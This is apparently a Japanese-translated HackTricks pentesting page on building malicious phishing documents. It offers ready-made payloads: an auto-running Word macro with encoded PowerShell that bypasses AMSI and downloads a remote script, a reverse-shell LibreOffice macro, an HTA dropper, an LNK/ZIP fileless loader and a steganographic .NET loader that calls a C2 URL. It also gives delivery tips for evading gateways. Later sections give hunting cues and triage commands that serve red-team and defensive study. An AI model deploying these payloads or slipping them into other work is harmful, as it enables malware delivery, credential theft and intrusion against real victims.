# Phishing Files & Documents

{{#include ../../banners/hacktricks-training.md}}

## Officeドキュメント

Microsoft Wordは、ファイルを開く前にファイルデータの検証を実行します。データ検証は、OfficeOpenXML標準に基づくデータ構造の識別という形式で実行されます。データ構造の識別中にエラーが発生した場合、分析対象のファイルは開かれません。

通常、マクロを含むWordファイルは`.docm`拡張子を使用します。ただし、ファイル拡張子を変更してファイル名を変更しても、マクロの実行機能を維持することが可能です。\
たとえば、RTFファイルは設計上マクロをサポートしていませんが、RTFに名前を変更したDOCMファイルはMicrosoft Wordによって処理され、マクロを実行できます。\
同じ内部構造とメカニズムが、Microsoft Office Suiteのすべてのソフトウェア（Excel、PowerPointなど）に適用されます。

次のコマンドを使用すると、一部のOfficeプログラムで実行される拡張子を確認できます。
```bash
assoc | findstr /i "word excel powerp"
```
DOCXファイルがリモートテンプレート（File –Options –Add-ins –Manage: Templates –Go）を参照しており、そのテンプレートにマクロが含まれている場合、マクロを「実行」することもできます。

### 外部画像の読み込み

移動先: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References、**Filed names**: includePicture、**Filename or URL**:_ http://<ip>/whatever

![Office Documents - 外部画像の読み込み: Insert -- Quick Parts -- Field に移動](<../../images/image (155).png>)

### マクロバックドア

マクロを使用して、ドキュメントから任意のコードを実行できます。

#### 自動読み込み関数

一般的に使用される関数ほど、AVに検出される可能性が高くなります。

- AutoOpen()
- Document_Open()

#### マクロコードの例
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### メタデータを手動で削除

**File > Info > Inspect Document > Inspect Document** に移動すると、Document Inspector が開きます。**Inspect** をクリックし、**Document Properties and Personal Information** の横にある **Remove All** をクリックします。

#### Doc Extension

完了したら、**Save as type** ドロップダウンを選択し、形式を **`.docx`** から Word 97-2003 **`.doc`** に変更します。\
これを行うのは、**`.docx` 内には macro を保存できず**、macro-enabled **`.docm`** 拡張子には**悪い印象**があるためです（例：thumbnail icon に大きな `!` が表示され、一部の web/email gateway では完全にブロックされます）。したがって、この**legacy `.doc` 拡張子が最善の妥協案**です。

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer documents には Basic macros を埋め込み、macro を **Open Document** event（Tools → Customize → Events → Open Document → Macro…）に bind することで、file が開かれたときに自動実行できます。<sup>[[1]](#references)</sup> シンプルな reverse shell macro は次のようになります。
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
文字列内の二重引用符（`""`）に注意してください。LibreOffice Basic では、リテラルの引用符をエスケープするために二重引用符を使用します。そのため、`...==""")` で終わる payload では、内部のコマンドと Shell 引数の両方の括弧が正しく対応します。

Delivery tips:

- `.odt` として保存し、開いたときに直ちに実行されるよう、macro をドキュメントイベントにバインドします。
- `swaks` でメールを送信する場合は、`--attach @resume.odt` を使用します（添付ファイルとしてファイル名の文字列ではなくファイルのバイト列を送信するため、`@` が必要です）。これは、検証なしで任意の `RCPT TO` recipient を受け入れる SMTP サーバーを悪用する場合に重要です。

## HTA Files

HTA は、**HTML と scripting languages（VBScript や JScript など）を組み合わせる** Windows program です。ユーザーインターフェースを生成し、browser の security model による制約を受けずに、「fully trusted」application として実行されます。

HTA は **`mshta.exe`** を使用して実行されます。通常、**Internet Explorer** とともにインストールされるため、**`mshta` は IE に依存します**。そのため、Internet Explorer がアンインストールされている場合、HTA は実行できません。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM Authentication の強制

**NTLM authentication を「リモート」で強制する**方法はいくつかあります。たとえば、ユーザーがアクセスするメールや HTML に**不可視の画像**を追加できます（HTTP MitM でも可能？）。また、フォルダーを**開くだけで** **authentication** を**トリガー**する**ファイルのアドレス**を被害者に送信することもできます。

**以下のページで、これらのアイデアなどを確認してください：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

ハッシュや authentication を盗むだけでなく、**NTLM relay attacks** も**実行できる**ことを忘れないでください：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

非常に効果的なキャンペーンでは、2つの正規の偽装ドキュメント（PDF/DOCX）と悪意のある .lnk を含む ZIP を配布します。仕組みとしては、実際の PowerShell loader が一意の marker の後に ZIP の raw bytes として格納され、.lnk がそれを切り出して完全にメモリ内で実行します。<sup>[[2]](#references)</sup>

.LNK の PowerShell one-liner で実装される一般的なフロー：

1) Desktop、Downloads、Documents、%TEMP%、%ProgramData%、および現在の working directory の親ディレクトリなど、一般的なパスから元の ZIP を探します。
2) ZIP bytes を読み込み、ハードコードされた marker（例：xFIQCV）を探します。marker より後のすべてのデータが、埋め込まれた PowerShell payload です。
3) ZIP を %ProgramData% にコピーしてそこに展開し、正規のファイルに見せかけるため偽装 .docx を開きます。
4) 現在のプロセスで AMSI を bypass します：[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) 次の stage の obfuscation を解除し（例：すべての # 文字を削除）、メモリ内で実行します。

埋め込まれた stage を切り出して実行する PowerShell skeleton の例：
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery では、信頼性の高い PaaS サブドメイン（例: *.herokuapp.com）が悪用されることが多く、payloads にゲートを設ける場合があります（IP/UA に基づいて無害な ZIPs を提供するなど）。
- 次のステージでは、base64/XOR shellcode を復号し、Reflection.Emit + VirtualAlloc 経由で実行することが多く、ディスク上の痕跡を最小限に抑えます。

同じチェーンで使用される Persistence
- Microsoft Web Browser control の COM TypeLib hijacking。これにより、IE/Explorer またはそれを埋め込むアプリが payload を自動的に再起動します。<sup>[[2]](#references)[[4]](#references)</sup> 詳細とすぐに使用できるコマンドはこちら:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- アーカイブデータの末尾に ASCII marker string（例: xFIQCV）が追加された ZIP files。
- 親フォルダーやユーザーフォルダーを列挙して ZIP を探し、decoy document を開く .lnk。
- [System.Management.Automation.AmsiUtils]::amsiInitFailed を使用した AMSI tampering。
- 信頼された PaaS domains 配下でホストされた links で終了する、長時間実行される business threads。

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

もう1つの繰り返し見られるパターンは、**document-impersonating `.lnk`** が無害な lure を直ちに開き、その裏で実際のチェーンを staging するものです。<sup>[[3]](#references)</sup>

Observed workflow:
1. shortcut は **PDF を装い**、`conhost.exe` または類似の proxy を使用して、難読化された PowerShell downloader を起動します。
2. PowerShell は明らかな token（`iw''r`、`g''c''i`、`r''e''n`、`c''p''i`、`&(g''cm sch*)`）を分割するため、`iwr`、`gci`、`ren`、`cpi`、または `schtasks` を探す単純な detection では command を見逃します。
3. stager はまず **decoy document をダウンロード**して victim のために開き、その後、バックグラウンドで malicious files を再構築します。
4. Payloads は **junk extensions** で書き込まれ、その後 filler characters を削除して rename される場合があり、明らかな `.exe` / `.cpl` artifacts の出現を遅らせます。
5. Persistence は、user-writable path から trusted host binary を起動する **minute-based scheduled task** によって確立されます。

このパターンから得られる最小限の hunting clues:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
認識しておくべき有用なステージング構成は次のとおりです。
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` または `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### 第2ステージがステルス性に優れている理由

Rapid7のケーススタディでは、scheduled taskが `C:\Users\Public\` から **`Fondue.exe`** を繰り返し起動していました。**`APPWIZ.cpl`** がその隣に配置され、**`RunFODW`** をエクスポートしていたため、信頼されたMicrosoftバイナリは正規のシステムコピーではなく、攻撃者のCPLをside-loadしました。

CPLは次の処理を行います。
- `C:\Windows\Tasks\editor.dat` から **AES-256-CBC** のblobを読み取る
- **Windows CNG / `bcrypt.dll`** を介して復号する
- 実行可能メモリを確保し、復号したshellcodeをコピーする
- **`EnumUILanguagesW`** のcallbackとしてshellcodeポインタを渡し、間接的に実行する

この最後の手順は個別にhuntingする価値があります。malwareは、直接 `((void(*)())buf)()` とjumpする代わりに、**正規のcallbackを受け取るWinAPI** を悪用して実行を移行することがよくあります。

このcampaignで復号されたpayloadは **Donut** shellcodeでした。その後、最終的なPEを完全にメモリ上へmapし、現在のprocess内で **AMSI/WLDP/ETW** にpatchを適用してから実行を引き渡しました。side-loadingおよびメモリ常駐型のpost-processingについて詳しくは、次を参照してください。

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

実践的なhuntingの着眼点：
- `.lnk` が `powershell.exe` または `conhost.exe` をspawnし、その後に目に見えるdecoy documentが表示される。
- **`C:\Users\Public\`** への短時間のdownload後、意味のない拡張子から即座にrenameされる。
- `GoogleErrorReport` のような目立たない名前のscheduled taskが、**user-writable directories** から実行される。
- 信頼されたバイナリが、同じnon-system directoryから **`.cpl` / `.dll`** ファイルをloadする。
- **`C:\Windows\Tasks\`** にBase64 text blobが書き込まれ、その後side-loaded moduleによって読み取られる。

## 画像内のSteganography-delimited payload（PowerShell stager）

最近のloader chainでは、obfuscated JavaScript/VBSを配布し、それがBase64のPowerShell stagerをdecodeして実行します。このstagerは画像（多くの場合GIF）をdownloadします。画像には、固有のstart/end markerの間にプレーンテキストとして隠された、Base64-encoded .NET DLLが含まれています。scriptはこれらのdelimiter（実環境で確認された例：«<<sudo_png>> … <<sudo_odt>>>»）を検索し、その間のtextをextractしてBase64-decodeし、assemblyをメモリ上にloadしたうえで、C2 URLを指定して既知のentry methodをinvokeします。<sup>[[5]](#references)</sup>

Workflow
- Stage 1: Archived JS/VBS dropper → 埋め込まれたBase64をdecode → -nop -w hidden -ep bypassを付けてPowerShell stagerをlaunch。
- Stage 2: PowerShell stager → imageをdownloadし、markerで区切られたBase64をcarveして、.NET DLLをメモリ上にloadし、C2 URLとoptionsを渡してそのmethodをcall（例：VAI）。
- Stage 3: Loaderがfinal payloadをretrieveし、通常はtrusted binary（一般的にはMSBuild.exe）へprocess hollowingを介してinjectします。<sup>[[7]](#references)[[8]](#references)</sup> process hollowingおよびtrusted utility proxy executionについて詳しくは、こちらを参照してください。

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

画像からDLLをcarveし、メモリ上で.NET methodをinvokeするPowerShellの例：

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notes
- これは ATT&CK T1027.003（steganography/marker-hiding）です。<sup>[[6]](#references)</sup> マーカーはキャンペーンごとに異なります。
- アセンブリをロードする前に、AMSI/ETW bypass と string deobfuscation が一般的に適用されます。
- Hunting: ダウンロードされた画像を既知の delimiters についてスキャンし、画像にアクセスして直ちに Base64 blobs を decode する PowerShell を特定します。

stego tools と carving techniques も参照してください：

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

繰り返し見られる initial stage は、アーカイブ内に配信される小さく、非常に強く obfuscated された `.js` または `.vbs` です。その唯一の目的は、埋め込まれた Base64 string を decode し、`-nop -w hidden -ep bypass` を指定して PowerShell を起動し、HTTPS 経由で次の stage を bootstrap することです。<sup>[[5]](#references)</sup>

Skeleton logic (abstract):
- 自身の file contents を読み取る
- junk strings の間にある Base64 blob を探す
- ASCII PowerShell に decode する
- `wscript.exe`/`cscript.exe` から `powershell.exe` を呼び出して実行する

Hunting cues
- コマンドラインで `-enc`/`FromBase64String` を使用して `powershell.exe` を spawn する archived JS/VBS attachments。
- user temp paths から `powershell.exe -nop -w hidden` を起動する `wscript.exe`。

## execution containers としての MSC documents (GrimResource)

Microsoft Management Console files（`.msc`）は、通常 `mmc.exe` で開かれる XML console definitions です。**GrimResource** は、古い XSS primitive を含む `apds.dll` resource への `StringTable` reference を weaponize します。そのため、ユーザーが crafted console を開くと、JavaScript が `mmc.exe` 内で実行されます。確認された samples では、`transformNode`-based obfuscation と **DotNetToJScript** を組み合わせ、通常の Office-macro path を使用せずに .NET payload を instantiate していました。<sup>[[9]](#references)</sup>

static triage では、untrusted MSC を text として扱い、**double-click しないでください**：<sup>[[9]](#references)</sup>
```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```
High-signalなruntime pivotは、`mmc.exe`がCLRまたはscriptコンポーネントをロードする、ネットワーク接続を作成する、あるいは`powershell.exe`、`cmd.exe`、`wscript.exe`、`cscript.exe`、`mshta.exe`、`rundll32.exe`、または予期しない実行ファイルを起動する場合です。形式自体は正規のものなので、検知ではすべてのMSCをブロックするのではなく、**origin + suspicious XML/script content + `mmc.exe` behavior**を相関させる必要があります。<sup>[[9]](#references)</sup>

## PDF/QRリダイレクターとpayload gating

PDFは、役立つためにexploitを必要としません。最近のcampaignでは、無害に見えるドキュメントに**QR codeまたは通常のlink**を配置し、ブラウザーセッションをメールの制御外へ移動させ、受信者のアドレスに応じて宛先を個別化しています。Microsoftは、QR URLが受信者ごとに固有で、RaccoonO365 credential-harvesting infrastructureへ誘導する2025年のPDFを報告しました。また並行するchainでは、IP/environment gatingを使用し、選択された訪問者にはJavaScript/MSI pathを返す一方、scannerや許可されていないclientには無害なPDFを返していました。<sup>[[10]](#references)</sup>

PDFのactionとrendered QR codeの両方をトリアージします。QRはextractable imageとして保存されず、vector-drawnになっている場合があります。そのため、埋め込み画像を抽出するだけでなく、すべてのページをrasterizeしてください：
```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```
分離された分析システムから、認証せずにデコードされた宛先とリダイレクトを調査します。役立つ hunting features には、メール本文がほぼ空で QR のみを含む PDF、query parameter に埋め込まれた recipient email、信頼できる hosting を経由する複数の redirect、IP、geolocation、cookies、referrer、user agent に応じて異なる content が返される仕組みなどがあります。単一の sandbox fetch では decoy しか受信できない場合があるため、制御した profiles で requests を比較してください。<sup>[[10]](#references)</sup>

## NTLM hashesを盗むWindowsファイル

**NTLM credsを盗める場所**に関するページを確認してください：

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – ZipLine Campaign：米国企業を標的とする高度な Phishing Attack](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode：中国をテーマにした Loader Chain における Dropping Elephant の Tradecraft を追跡](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Hijack the TypeLib – 新しい COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – PhantomVAI Loader がさまざまな Infostealers を配信](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource：initial access と evasion のための Microsoft Management Console](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Threat actors が tax season を利用して tax-themed phishing campaigns を展開](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
